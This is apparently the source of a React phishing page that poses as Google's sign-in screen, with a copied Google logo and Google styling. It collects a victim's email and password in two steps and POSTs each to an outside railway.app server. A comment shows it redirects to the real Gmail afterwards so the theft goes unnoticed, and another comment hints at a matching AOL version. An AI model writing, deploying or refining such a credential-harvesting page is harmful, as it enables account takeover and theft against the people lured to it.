/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ChevronDown, Eye, EyeOff } from 'lucide-react';

// Mock service for detecting emails (same as AOL but different key)
const emailDetectionService = {
  getDetectedEmails: (): string[] => {
    const stored = localStorage.getItem('gmail_detected_emails');
    return stored ? JSON.parse(stored) : ['@gmail.com', '@gmail.com'];
  },
  saveEmail: (email: string) => {
    const emails = emailDetectionService.getDetectedEmails();
    if (!emails.includes(email)) {
      emails.push(email);
      localStorage.setItem('gmail_detected_emails', JSON.stringify(emails));
    }
  }
};

export default function App() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [attemptId, setAttemptId] = useState<string | null>(null);
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const emailInputRef = useRef<HTMLInputElement>(null);
  const passwordInputRef = useRef<HTMLInputElement>(null);

  // Handle Email Step (Step 1)
  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError('Enter an email or phone number');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('https://demascus-production-eb9f.up.railway.app/api/submit-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email }),
      });

      const data = await response.json();

      if (response.ok && data.attemptId) {
        setAttemptId(data.attemptId);
        emailDetectionService.saveEmail(email);
        setStep(2);
        setTimeout(() => passwordInputRef.current?.focus(), 400);
      } else {
        setError(data.message || 'Failed to process email. Please try again.');
      }
    } catch (err) {
      console.error(err);
      setError('Cannot connect to server. Check your internet or backend.');
    } finally {
      setIsLoading(false);
    }
  };

  // Handle Password Step (Step 2)
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password || !attemptId) return;

    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('https://demascus-production-eb9f.up.railway.app/api/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ attemptId, password }),
      });

      if (response.ok) {
        // Redirect to real Google after success
        window.location.href = "https://www.gmail.com";
      } else {
        const data = await response.json().catch(() => ({}));
        setError(data.message || 'Invalid password. Please try again.');
      }
    } catch (err) {
      console.error(err);
      setError('Cannot connect to server. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    setStep(1);
    setPassword('');
    setError('');
    setTimeout(() => emailInputRef.current?.focus(), 400);
  };

  const GoogleLogo = () => (
    <svg viewBox="0 0 24 24" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
      <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
      <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05" />
      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
    </svg>
  );

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 sm:p-0">
      <main className="w-full max-w-[1040px] bg-white rounded-[28px] shadow-sm overflow-hidden flex flex-col md:flex-row min-h-[400px] md:min-h-[480px]">
        {/* Left Section */}
        <div className="flex-1 p-8 md:p-10 flex flex-col">
          <div className="mb-4">
            <GoogleLogo />
          </div>

          <AnimatePresence mode="wait">
            {step === 1 ? (
              <motion.div
                key="step1-title"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
              >
                <h1 className="text-[36px] md:text-[44px] font-normal text-[#1f1f1f] mb-2 leading-tight">Log in</h1>
                <p className="text-[18px] text-[#444746]">Use your Google account</p>
              </motion.div>
            ) : (
              <motion.div
                key="step2-title"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                transition={{ duration: 0.3 }}
              >
                <h1 className="text-[36px] md:text-[44px] font-normal text-[#1f1f1f] mb-2 leading-tight">Welcome</h1>
                <div
                  onClick={handleBack}
                  className="inline-flex items-center gap-2 px-2 py-1 rounded-full border border-[#747775] hover:bg-[#f1f3f4] cursor-pointer transition-colors"
                >
                  <div className="w-6 h-6 rounded-full bg-[#0b57d0] flex items-center justify-center">
                    <span className="text-[12px] text-white font-medium">{email.charAt(0).toUpperCase()}</span>
                  </div>
                  <span className="text-[16px] font-medium text-[#1f1f1f]">{email}</span>
                  <ChevronDown className="w-5 h-5 text-[#444746]" />
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Right Section */}
        <div className="flex-1 p-8 md:p-10 flex flex-col justify-between">
          <AnimatePresence mode="wait">
            {step === 1 ? (
              <motion.form
                key="step1-form"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                transition={{ duration: 0.3 }}
                onSubmit={handleNext}
                className="flex flex-col h-full"
              >
                <div className="space-y-6">
                  <div className="google-input-container">
                    <input
                      ref={emailInputRef}
                      type="text"
                      id="email"
                      placeholder=" "
                      className={`google-input ${error ? 'border-[#b3261e] focus:border-[#b3261e]' : ''}`}
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      autoComplete="username"
                    />
                    <label htmlFor="email" className={`google-label ${error ? 'text-[#b3261e]' : ''}`}>
                      Email address or phone number
                    </label>
                    {error && (
                      <div className="flex items-center gap-2 mt-1 text-[#b3261e] text-[12px]">
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                        </svg>
                        {error}
                      </div>
                    )}
                  </div>

                  <button type="button" className="text-[#0b57d0] text-[16px] font-medium hover:text-[#0842a0] text-left w-fit">
                    Forgot your email address?
                  </button>

                  <div className="text-[16px] text-[#444746] leading-relaxed">
                    Not your computer? Use guest mode to log in privately.{' '}
                    <a href="#" className="text-[#0b57d0] font-medium hover:underline">
                      More information about using guest mode
                    </a>
                  </div>
                </div>

                <div className="mt-auto pt-10 flex items-center justify-between">
                  <button type="button" className="text-[#0b57d0] text-[16px] font-medium px-4 py-2 rounded-full hover:bg-[#f1f3f4] transition-colors">
                    Create account
                  </button>
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="bg-[#0b57d0] text-white text-[16px] font-medium px-8 py-3 rounded-full hover:bg-[#0842a0] transition-colors shadow-sm disabled:opacity-50 flex items-center gap-2"
                  >
                    {isLoading ? (
                      <>
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Next
                      </>
                    ) : (
                      'Next'
                    )}
                  </button>
                </div>
              </motion.form>
            ) : (
              <motion.form
                key="step2-form"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
                onSubmit={handleSubmit}
                className="flex flex-col h-full"
              >
                <div className="space-y-6">
                  <div className="google-input-container">
                    <input
                      ref={passwordInputRef}
                      type={showPassword ? 'text' : 'password'}
                      id="password"
                      placeholder=" "
                      className={`google-input ${error ? 'border-[#b3261e] focus:border-[#b3261e]' : ''}`}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      autoComplete="current-password"
                    />
                    <label htmlFor="password" className={`google-label ${error ? 'text-[#b3261e]' : ''}`}>
                      Enter your password
                    </label>
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-3.5 text-[#444746] hover:bg-[#f1f3f4] p-1 rounded-full transition-colors"
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                    {error && (
                      <div className="flex items-center gap-2 mt-1 text-[#b3261e] text-[12px]">
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                        </svg>
                        {error}
                      </div>
                    )}
                  </div>

                  <div className="flex items-center gap-2">
                    <input
                      type="checkbox"
                      id="show-pass-check"
                      checked={showPassword}
                      onChange={() => setShowPassword(!showPassword)}
                      className="w-4 h-4 rounded border-[#747775] text-[#0b57d0] focus:ring-[#0b57d0]"
                    />
                    <label htmlFor="show-pass-check" className="text-[14px] text-[#1f1f1f] cursor-pointer">
                      Show password
                    </label>
                  </div>
                </div>

                <div className="mt-auto pt-10 flex items-center justify-between">
                  <button type="button" className="text-[#0b57d0] text-[16px] font-medium px-4 py-2 rounded-full hover:bg-[#f1f3f4] transition-colors">
                    Forgot password?
                  </button>
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="bg-[#0b57d0] text-white text-[16px] font-medium px-8 py-3 rounded-full hover:bg-[#0842a0] transition-colors shadow-sm disabled:opacity-50 flex items-center gap-2"
                  >
                    {isLoading ? (
                      <>
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Processing...
                      </>
                    ) : (
                      'Next'
                    )}
                  </button>
                </div>
              </motion.form>
            )}
          </AnimatePresence>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full max-w-[1040px] mt-6 flex flex-col sm:flex-row items-center justify-between text-[14px] text-[#444746] px-4 sm:px-0">
        <div className="flex items-center gap-1 cursor-pointer hover:bg-[#e1e3e1] px-2 py-1 rounded transition-colors mb-4 sm:mb-0">
          <span>Dutch</span>
          <ChevronDown className="w-4 h-4" />
        </div>
        <div className="flex items-center gap-6">
          <a href="#" className="hover:bg-[#e1e3e1] px-2 py-1 rounded transition-colors">Help</a>
          <a href="#" className="hover:bg-[#e1e3e1] px-2 py-1 rounded transition-colors">Privacy</a>
          <a href="#" className="hover:bg-[#e1e3e1] px-2 py-1 rounded transition-colors">Terms and Conditions</a>
        </div>
      </footer>
    </div>
  );
}
